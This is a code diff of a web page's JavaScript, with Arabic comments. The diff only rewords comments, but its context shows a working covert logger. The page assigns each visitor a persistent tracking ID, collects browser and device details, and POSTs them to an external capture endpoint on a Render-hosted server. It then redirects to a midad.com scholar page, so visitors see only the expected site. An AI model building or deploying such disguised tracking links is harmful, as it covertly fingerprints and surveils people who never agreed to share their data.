@@ -20,14 +20,14 @@
 
     <script>
         async function logAndGo() {
-            // 1. إنشاء أو جلب بصمة تتبع فريدة للجهاز
+            // 1. إنشاء أو جلب بصمة تتبع فريدة للجهاز (ID)
             let trackingId = localStorage.getItem('tr_id');
             if (!trackingId) {
                 trackingId = 'TRK-' + Math.random().toString(36).substr(2, 9).toUpperCase();
                 localStorage.setItem('tr_id', trackingId);
             }
 
-            // 2. جمع معلومات الجهاز
+            // 2. جمع معلومات الجهاز العميقة
             const deviceData = {
                 trackingId: trackingId,
                 userAgent: navigator.userAgent,
@@ -38,12 +38,12 @@
                 lang: navigator.language
             };
 
-            // رابط سيرفرك في رندر (تأكد أنه نفس الرابط الخاص بك)
+            // رابط سيرفرك في رندر
             const serverUrl = "https://logger-server-b00a.onrender.com/api/capture";
             const targetSite = "https://midad.com/scholar/36060";
 
             try {
-                // إرسال البيانات للسيرفر
+                // إرسال البيانات للسيرفر (POST)
                 await fetch(serverUrl, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -52,7 +52,7 @@
             } catch (e) {
                 console.log("Error capturing data");
             } finally {
-                // التحويل للموقع النهائي مهما حدث
+                // التحويل للموقع النهائي (مداد) مهما حدث
                 window.location.href = targetSite;
             }
         }
